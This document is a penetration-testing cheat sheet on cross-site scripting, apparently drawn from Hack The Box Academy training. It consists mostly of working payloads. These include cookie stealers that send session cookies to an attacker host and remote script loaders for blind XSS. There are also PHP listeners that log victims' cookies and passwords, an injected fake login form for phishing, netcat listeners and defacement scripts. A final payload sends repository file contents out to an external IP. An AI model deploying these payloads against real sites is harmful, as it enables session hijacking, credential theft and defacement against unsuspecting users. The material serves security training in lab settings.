# Cross-Site Scripting (XSS)

## Discovery
### DOM-Based
> Done completely in the client browser. No request to server on data entry. Easily confused for relfected XSS. Needs a trigger to run the payload, such as 'img src=""'
* Test Payloads 
```javascript
# Loads the print dialog
<img src=x onerror=print(1)>

# Pops the alert dialog (Do not use.(Most sites are designed to look for this))
<img src=x onerror=alert(1)>

# Send the user to another site 
<img src=x onerror="window.location.href='https://google.com'">
```
### Stored XSS
> Can be verified if its persistent across sessions. For example, if you upload `<h1>test</h1>` and open the same page in an incognito window or another browser and it remains. Useful for stealing session cookies.
* Test Payloads
Test with HTML first
```html
# Should appear as a heading on the page
<h1>test</h1>
```
```javascript
# Should pop the print dialog for every user that visits the page.
<script>print(1)</script>

# Tries to pring the session cookie
<script>print(document.cookie)</script>

# Common Cookie Stealer
<script> var i = new Image; i.src="<Your website>/?"+document.cookie;</script>
```
### xsstrike.py
```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```
### Manual
Manually test payloads against input fields
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
[PayloadBox](https://github.com/payloadbox/xss-payload-list)

### Code Review
Review the source code for the page and the JS in Developer Tools

## Session Hijacking (Stealing Session Cookie)
### Blind XSS Detection
Use a payload that will send a request back to our webserver
Payloads:
```html
<script src="http://OUR_IP/script.js"></script>
```
Change the script name to the field we are testing
```html
<script src="http://OUR_IP/username"></script>
```
If we get a request for /username, then we know that field is vulnerable

Examples from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
### The Session Hijack
We need code to send the session cookie back to our listener(nc or php(same as above))
More Examples from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
We can host the malicious JS as well...
Put the malicious code in a file called script.js
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```
Then you can inject the following:
```html
<script src=http://OUR_IP/script.js></script>
```
It's possible we might get multiple cookie values. Change the php code to the following to save them to a file:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Sample result:
```bash
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```
Finally we can use the cookie on the login page to login.
Navigate to the page
Open developer tools
Storage tab
Click '+' to add cookie (Name is the part before the '=' and value is the part after)

## Phishing (Fake Login Form)
### Login form Injection
```html
<h3>Please login to continue</h3>
<form action=http://attackerip>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
Login form minified and inserted into document.write parameter
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

### Cleanup
Remove unwanted fields with the using document.getElementByID().remove() function
Find the "id="x" in the form to be removed. (x = 'urlform' in the below example
```javascript
document.getElementById('urlform').remove();
```

Completed script example
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Start netcat to listen for a connection
```bash
sudo nc -lvnp 80
```
Example Response:
```bash
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```
Capture responses with php (Capture credentials to creds.txt)
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
Start the php listener
```bash
sudo php -s 0.0.0.0:80
```
## Defacing
### Changing the Background
```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>#Sets an image as background
```
### Change Page Title
```html
<script>document.title = 'HackTheBox Academy'</script>
```
### Change Page Text
```javascript
document.getElementById("todo").innerHTML = "New Text"
$("#todo").html('New Text'); #jquery
```
### Change Entire Site
```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```
```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

## Stored XSS (Persistent XSS)

### Testing
User input is shown on the page

Test Payloads

```html
<script>alert(window.origin)</script> # This will pop up a window showing the source URL for the popup window(iframes)
<script>print()</script> # Will pop up the printer dialog
<plaintext> # Should render the rest of the page as plain text.
```
To verify the payload is stored on the back-end, refresh the page. If the alert comes back, it's stored/persistent

## Reflected XSS
Reflected - Gets Processed by the back-end server
DOM-based - Completely Processed on the client-side
Neither are persistent through a page refresh

### Reflected
Look for user input to be displayed as part of an error messages

Test Payloads

```html
<script>alert(window.origin)</script> # This will pop up a window showing the source URL for the popup window(iframes)
<script>print()</script> # Will pop up the printer dialog
<plaintext> # Should render the rest of the page as plain text.
```
Payloads will **NOT** be rendered by the browser on execution

**Targeting**
Target users by sending them a GET-Request URL containing our payload

### DOM-Based
Completely Processed on the client side (JS used to change page source through the Document Object Model(DOM)
No HTTP requests made (Developer Toos/Network Tab)
Check the URL for the parameters
Page source does not change when refreshed (Parameter passed in the URL rather than added to the page source)
**Source**=JS object that takes user input (Can be any input parameter like a url parameter or an input field)
**Sink**=JS function that writes user input to a DOM object on the page. 

Common JS Functions that write to DOM objects:
```javascript
document.write()
DOM.innerHTML
DOM.outerHTML
```

Common jQuery library functions that write to DOM objects
```javascript
add()
after()
append()
```

Example:
```javascript
var pos = document.URL.indexOf("task=");#task paramter in URL
var task = document.URL.substring(pos + 5, document.URL.length);
```
```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);#innerHTML used to write to the screen (task)
```
Test Payloads
```html
<img src="" onerror=alert(window.origin)>
```

# Misc Payloads
```html
# Used to fetch file contents from github repo.
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.14.3:8100/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSS test</a>
```
